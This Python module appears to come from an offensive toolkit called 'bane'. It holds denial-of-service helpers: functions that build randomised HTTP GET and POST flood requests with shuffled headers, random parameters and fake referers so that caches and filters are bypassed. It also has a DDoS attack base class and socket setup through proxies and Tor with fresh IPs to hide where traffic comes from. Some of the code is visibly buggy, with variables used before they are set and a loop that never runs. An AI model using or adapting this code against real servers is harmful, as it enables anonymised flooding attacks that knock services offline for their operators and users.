import requests, socks, os, sys, urllib, socket, random, time, threading, ssl
import urllib3,json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# import the dependencies for each python version
if sys.version_info < (3, 0):
    # Python 2.x
    import httplib
    import urllib2
    try:
        from scapy.config import conf

        conf.ipv6_enabled = False
        from scapy.all import *
    except:
        pass
else:
    # Python 3.x
    import http.client

    httplib = http.client
    import urllib.request

    urllib2 = urllib.request
    from kamene.config import conf

    conf.ipv6_enabled = False
    from kamene.all import *
from struct import *
from bane.scanners.botnet.iot import getip
from bane.common.payloads import *
from bane.utils.proxer import parse_proxies_list,get_proxy_socket,get_tor_socks5_socket,parse_proxy_string,wrap_socket_with_ssl,load_and_parse_proxies,load_and_parse_proxies_all,get_tor_socks5_proxy,get_requests_proxies_from_parameters,get_socket_proxies_from_parameters


if os.path.isdir("/data/data") == True:
    adr = True  # the device is an android
if os.path.isdir("/data/data/com.termux/") == True:
    termux = True  # the application which runs the module is Termux
if (termux == False) or (adr == False):
    from bane.utils.swtch import *

def reorder_headers_randomly(s):
    b = s.split("\r\n\r\n")[1]
    a = s.split("\r\n\r\n")[0]
    m = a.split("\r\n")[0]
    c = a.split("\r\n")[1:]
    random.shuffle(c)
    num=random.randint(1,4)
    i=[]
    while len(i)>num:
        q=random.choice(c)
        if 'host:' not in q.lower() or 'user-agent:' not in q.lower() or 'content-length' not in q.lower():
            i.append(q)
    for x in i:
        if x in c:
            c.remove(x)
    return m + "\r\n" + "\r\n".join(c) + "\r\n\r\n" + b


def random_param():
    a = random.randint(1, 2)
    if a == 1:
        return str(random.randint(1, 1000))
    else:
        return random.choice(lis)


def setup_http_packet(
    target,
    ty,
    paths,
    post_field_min,
    post_field_max,
    post_min,
    post_max,
    cookie,
    user_agents,
):
    pa = random.choice(paths)  # bypassing cache engine
    q = ""
    for i in range(random.randint(2, 5)):
        q += random_param() + random_param()
    p = ""
    for i in range(random.randint(2, 5)):
        p += random_param() + random_param()
    if "?" in pa:
        jo = "&"
    else:
        jo = "?"
    pa += jo + q + "=" + p
    # setting random headers
    for l in range(random.randint(1, 5)):
        ed = random.choice(ec)
        oi = random.randint(1, 3)
        if oi == 2:
            gy = 0
            while gy < 1:
                df = random.choice(ec)
                if df != ed:
                    gy += 1
            ed += ", "
            ed += df
    l = random.choice(al)
    for n in range(random.randint(0, 5)):
        l += ";q={},".format(round(random.uniform(0.1, 1), 1)) + random.choice(al)
    kl = random.randint(1, 2)
    ck = ""
    if cookie:
        ck = "Cookie: " + cookie + "\r\n"
    if ty == 1:
        m = "GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
            pa,
            ck,
            random.choice(user_agents),
            random.choice(a),
            l,
            ed,
            random.choice(ac),
            random.randint(100, 1000),
            random.choice(cc),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
        )
    else:
        k = ""
        for _ in range(random.randint(post_field_min, post_field_max)):
            k += random.choice(lis)
        j = ""
        for x in range(random.randint(post_min, post_max)):
            j += random.choice(lis)
        par = k + "=" + j
        m = "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(
            pa,
            ck,
            random.choice(user_agents),
            l,
            random.randint(300, 1000),
            len(par),
            (
                random.choice(referers)
                + random.choice(lis)
                + str(random.randint(0, 100000000))
                + random.choice(lis)
            ),
            target,
            par,
        )
    return reorder_headers_randomly(m)


def get_public_dns(timeout=15):
    try:
        return (
            requests.get(
                "https://public-dns.info/nameservers.txt", timeout=timeout
            ).text
        ).split("\n")
    except:
        return []


class DDoS_Class:

    def done(self):
        if "stop" in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__["counter"]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
        return a





def get_socket_connection(host,port,timeout=5,no_delay=False,ssl_wrap=False,**kwargs):
    s=get_proxy_socket(host,port,timeout=timeout,no_delay=no_delay,**kwargs)
    if ssl_wrap==True:
        s=wrap_socket_with_ssl(s,host)
    return s


def get_tor_socket_connection(host,port,new_ip=True,ssl_wrap=False,timeout=5,no_delay=False,**kwargs):
    s=get_tor_socks5_socket(host,port,new_ip=new_ip,timeout=timeout,no_delay=no_delay,**kwargs)
    if ssl_wrap==True:
        s=wrap_socket_with_ssl(s,host)
    return s


